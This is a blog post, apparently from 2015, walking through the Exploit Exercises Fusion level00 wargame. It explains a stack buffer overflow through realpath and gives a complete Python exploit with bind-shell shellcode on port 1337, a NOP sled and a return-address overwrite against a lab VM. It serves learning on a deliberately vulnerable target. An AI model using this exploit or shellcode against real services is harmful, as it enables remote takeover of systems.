<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Exploit Exercises - Fusion Level00 &#8211; A Little (1 << 3) + y</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Poping a shell on the first Fusion challenge">
    <meta name="author" content="Chris">
    <meta name="keywords" content="wargames, fusion, exploit-exercises">
    <link rel="canonical" href="breadchris.github.io/wargames/fusion/exploit-exercises/2015/01/20/fusion/">
    <link rel="alternate" type="application/rss+xml" title="RSS Feed for A Little (1 << 3) + y" href="/feed.xml" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/pixyll.css?201508120112" type="text/css">
    <link rel="stylesheet" href="/css/prism.css?201508120112" type="text/css">

    <!-- Fonts -->
    <link href='//fonts.googleapis.com/css?family=Merriweather:900,900italic,300,300italic' rel='stylesheet' type='text/css'>
    <link href='//fonts.googleapis.com/css?family=Lato:900,300' rel='stylesheet' type='text/css'>
    
      <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
    


    <!-- Open Graph -->
    <!-- From: https://github.com/mmistakes/hpstr-jekyll-theme/blob/master/_includes/head.html -->
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Exploit Exercises - Fusion Level00">
    <meta property="og:description" content="Blades out like Wolverine, but it was all a huge act man. ~ octobersveryown">
    <meta property="og:url" content="breadchris.github.io/wargames/fusion/exploit-exercises/2015/01/20/fusion/">
    <meta property="og:site_name" content="A Little (1 &lt;&lt; 3) + y">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary" />
    
        <meta name="twitter:site" content="@breadchris" />
    
    <meta name="twitter:title" content="Exploit Exercises - Fusion Level00" />
    <meta name="twitter:description" content="Poping a shell on the first Fusion challenge" />
    <meta name="twitter:url" content="breadchris.github.io/wargames/fusion/exploit-exercises/2015/01/20/fusion/" />

    <!-- Icons -->
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png">
    <link rel="icon" type="image/png" href="/favicon-192x192.png" sizes="192x192">
    <link rel="icon" type="image/png" href="/favicon-160x160.png" sizes="160x160">
    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
    <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
        
    
    <script src="/js/prisim.js"></script>
</head>

<body class="site">
  <div class="site-wrap">
    <header class="site-header px2 px-responsive">
  <div class="mt2 wrap">
    <div class="measure">
      <a href="breadchris.github.io" class="site-title">A Little (1 << 3) + y</a>
      <nav class="site-nav">
        <a href="/about/">About</a>
<a href="/contact/">Contact</a>

      </nav>
      <div class="clearfix"></div>
      
        <div class="social-icons">
  <div class="left">
    
      <a class="fa fa-github" href="https://github.com/breadchris"></a>
    
    
    <a class="fa fa-rss" href="/feed.xml"></a>
    
      <a class="fa fa-twitter" href="https://twitter.com/breadchris"></a>
    
    
    
    
    
  </div>
  <div class="right">
    
    
    
  </div>
</div>
<div class="clearfix"></div>

      
    </div>
  </div>
</header>


    <div class="post p2 p-responsive wrap" role="main">
      <div class="measure">
        


<div class="post-header mb2">
  <h1>Exploit Exercises - Fusion Level00</h1>
  <span class="post-meta">Jan 20, 2015</span><br>
    
  <span class="post-meta small">
  
    3 minute read
  
  </span>
</div>

<article class="post-content">
  <p>This challenge is pretty much a straight forward stack overflow where you are using the fact that when we call real_path:</p>

<p>[c]
int fix_path(char *path)
{
  char resolved[128];</p>

<p>if(realpath(path, resolved) == NULL) return 1; // can’t access path. will error trying to open
  strcpy(path, resolved);
}
[/c]</p>

<p>our <code>path</code> variable’s size is controlled by our initial read in <code>parse_http_request</code>:</p>

<p>[c]
  char buffer[1024];
  char* path;
  …
  if(read(0, buffer, sizeof(buffer)) &lt;= 0) errx(0, “Failed to read from remote host”);
  …
  path = &amp;buffer[4];
  …
  fix_path(path);
[/c]</p>

<p>as our <code>path</code> variable is simply a pointer to a location in <code>buffer</code> 4 bytes in. So looking up what <code>realpath</code> <a title="Realpath" href="http://man7.org/linux/man-pages/man3/realpath.3.html" target="_blank">does</a> we find that it will copy the given <code>path</code> string to our <code>resolved</code> buffer expanding any relative paths that we might have. <code>realpath</code> will also make sure that the file actually exists and if it doesn’t it will return <code>NULL</code>. So for our sake we really don’t care if we can access the <code>strcpy</code> because <code>realpath</code> will do the same thing for us!</p>

<p>So now that we know what we are targeting, we need to make sure we pass the earlier checks to actually get to this point.</p>

<p>[c]
  …
  if(memcmp(buffer, “GET “, 4) != 0) errx(0, “Not a GET request”); // Is “GET “ the first part of the given string?</p>

<p>path = &amp;buffer[4];
  q = strchr(path, ‘ ‘); // After the “GET “ string, is there another space?
  if(! q) errx(0, “No protocol version specified”); // If not, throw an error
  *q++ = 0; // Replace the space with a NULL character so we separate the path and protocol
  if(strncmp(q, “HTTP/1.1”, 8) != 0) errx(0, “Invalid protocol”); // Is the protocol == “HTTP/1.1”?
  …
[/c]</p>

<p>So from this we can deduce our payload is going to be something in the form of <code>GET &lt;fill buffer&gt;&lt;return address&gt; HTTP/1.1&lt;nop sled&gt;&lt;shellcode&gt;</code>. You can stick your shellcode in the nop sled but it is up to you :D Since we want $eip to point to our shellcode located some number of bytes away from the start of our buffer, we can start with using the buffer address that get leaked to us by the program and add some offset to get to our nop sled (the nop sled is optional here since we can really just calculate the exact offset but I was too lazy lol). Wiht some playing around in the binary you can find number of bogus characters to fill the buffer to be 139, after the 139th character, you will begin to overwrite the return address :D. Thus we would want our return address would be: buffer address + 139 + a few more to make sure we go past the return address that we stuck in there and onto the nop sled. Putting it all together we get:</p>

<p>[python]
import sys
from os.path import expanduser
home = expanduser(“~”)
sys.path.append(home + “/Template”)
from isis import *</p>

<h1 id="allow-time-to-attach-debugger">Allow time to attach debugger</h1>
<p>debug = True
#change for local vs remote exploit
host = “172.16.76.131”
port = 20000</p>

<h1 id="set-up-connection-and-set-timeout">set up connection and set timeout</h1>
<p>def connect():
	s = get_socket((host,port))
	s.settimeout(0x1000000)
	return s</p>

<p>s = connect()
if debug:
	raw_input(“?”)</p>

<h1 id="shell-bind-tcp-shellcode-port-1337---89-bytes---httpshell-stormorgshellcodefilesshellcode-882php">Shell Bind TCP Shellcode Port 1337 - 89 bytes - http://shell-storm.org/shellcode/files/shellcode-882.php</h1>
<p>shellcode = “\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80”</p>

<p>fill_buff = “A”*139 + lei(0xbffff8f8 + 170)</p>

<p>payload = “GET “
payload += fill_buff
payload += “ HTTP/1.1”
payload += “\x90” * 32
payload += shellcode</p>

<p>s.send(payload)</p>

<h1 id="keeps-connection-open">keeps connection open</h1>
<p>telnet_shell(s)
[/python]</p>

<p>We then have a shell listening on port 1337 that we can nc into :D</p>

<p>(I used a collection of helper functions from Blankwall’s Template library. I encourage you to check it out: (<a href="https://github.com/blankwall/Template">Github</a>)</p>

</article>









      </div>
    </div>
  </div>

  <footer class="center">
  <div class="measure">
    <small>
      Theme crafted with &lt;3 by <a href="http://johnotander.com">John Otander</a> (<a href="https://twitter.com/4lpine">@4lpine</a>).
    </small>
  </div>
</footer>

</body>
</html>
